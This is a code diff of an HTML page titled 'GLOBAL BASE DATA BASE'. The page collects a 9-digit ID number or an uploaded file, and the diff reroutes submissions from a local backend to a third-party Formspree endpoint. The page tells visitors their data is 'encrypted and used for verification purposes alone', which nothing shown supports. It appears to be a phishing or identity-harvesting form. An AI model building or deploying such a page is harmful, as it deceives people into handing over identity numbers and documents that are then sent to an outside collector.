@@ -17,7 +17,6 @@
       align-items: center;
     }
 
-    /* Overlay for readability */
     body::before {
       content: "";
       position: fixed;
@@ -44,13 +43,7 @@
       font-size: 22px;
       color: #1a1a1a;
       margin-bottom: 25px;
-      letter-spacing: 0.5px;
       font-weight: bold;
-    }
-    @media (max-width: 480px) {
-      .title {
-        font-size: 18px;
-      }
     }
     form {
       display: flex;
@@ -61,8 +54,6 @@
       text-align: left;
       font-weight: 600;
       margin-bottom: 6px;
-      font-size: 0.95em;
-      color: #333;
     }
     input[type="text"], input[type="file"] {
       padding: 12px;
@@ -70,12 +61,6 @@
       border-radius: 8px;
       font-size: 1em;
       width: 100%;
-      transition: all 0.25s ease;
-    }
-    input[type="text"]:focus, input[type="file"]:focus {
-      border-color: #0078d4;
-      box-shadow: 0 0 0 3px rgba(0,120,212,0.2);
-      outline: none;
     }
     button {
       background: linear-gradient(135deg, #0078d4, #005a9e);
@@ -86,49 +71,18 @@
       cursor: pointer;
       font-size: 16px;
       font-weight: bold;
-      transition: background 0.3s ease, transform 0.1s ease;
     }
-    button:hover {
-      background: linear-gradient(135deg, #005a9e, #004377);
-      transform: translateY(-2px);
-    }
-    .error {
-      color: #d32f2f;
-      font-weight: bold;
+    .success, .error {
       margin-top: 10px;
-      font-size: 0.9em;
-      text-align: center;
-    }
-    .success {
-      color: green;
       font-weight: bold;
-      margin-top: 10px;
-      font-size: 0.95em;
-      text-align: center;
     }
-    .optional {
-      font-size: 0.8em;
-      color: #666;
-      text-align: left;
-      margin-top: -8px;
-    }
-    p {
-      font-size: 0.85em;
-      color: #555;
-      margin-top: 20px;
-      line-height: 1.4;
-    }
-    @keyframes fadeIn {
-      from { opacity: 0; transform: translateY(10px); }
-      to { opacity: 1; transform: translateY(0); }
-    }
+    .success { color: green; }
+    .error { color: red; }
   </style>
 </head>
 <body>
   <div class="card">
-    <h1 class="title">
-      GLOBAL BASE DATA BASE
-    </h1>
+    <h1 class="title">GLOBAL BASE DATA BASE</h1>
 
     <form id="idForm" enctype="multipart/form-data">
       <div>
@@ -139,7 +93,7 @@
           name="id" 
           maxlength="9" 
           inputmode="numeric" 
-          pattern="\d*"
+          pattern="\d{9}" 
         >
       </div>
 
@@ -152,48 +106,54 @@
       <button type="submit">Submit</button>
     </form>
 
-    <div id="errorBox" class="error" aria-live="polite"></div>
-    <div id="successBox" class="success" aria-live="polite"></div>
+    <div id="successBox" class="success"></div>
+    <div id="errorBox" class="error"></div>
 
     <p><strong>All data are encrypted and used for verification purposes alone.</strong></p>
   </div>
 
   <script>
     const form = document.getElementById("idForm");
-    const errorBox = document.getElementById("errorBox");
     const successBox = document.getElementById("successBox");
+    const errorBox = document.getElementById("errorBox");
 
     form.addEventListener("submit", async (e) => {
-      e.preventDefault(); // stop reload
+      e.preventDefault(); // stop normal submit
 
-      errorBox.textContent = "";
       successBox.textContent = "";
+      errorBox.textContent = "";
 
       const idInput = document.getElementById("id").value.trim();
       const fileInput = document.getElementById("file").files.length;
 
-      if (idInput !== "" && !/^\d{9}$/.test(idInput)) {
-        errorBox.textContent = "ID must be exactly 9 digits.";
+      // Validate: must be exactly 9 digits OR a file must be uploaded
+      if (idInput === "" && fileInput === 0) {
+        errorBox.textContent = "⚠️ Please enter a 9-digit ID or upload a file.";
         return;
       }
 
-      if (idInput === "" && fileInput === 0) {
-        errorBox.textContent = "Please provide a 9-digit ID or upload a file.";
+      if (idInput !== "" && !/^\d{9}$/.test(idInput)) {
+        errorBox.textContent = "⚠️ ID must be exactly 9 digits.";
         return;
       }
 
       const formData = new FormData(form);
 
       try {
-        const response = await fetch("/submit", {
+        const response = await fetch("https://formspree.io/f/mnnbvodj", {
           method: "POST",
-          body: formData
+          body: formData,
+          headers: { "Accept": "application/json" }
         });
 
-        const result = await response.text();
-        successBox.textContent = result; // show backend message
+        if (response.ok) {
+          successBox.textContent = "✅ Submission Successful!";
+          form.reset();
+        } else {
+          errorBox.textContent = "⚠️ Submission failed. Try again.";
+        }
       } catch (err) {
-        errorBox.textContent = "Something went wrong. Please try again.";
+        errorBox.textContent = "⚠️ Network error. Please try again.";
       }
     });
   </script>
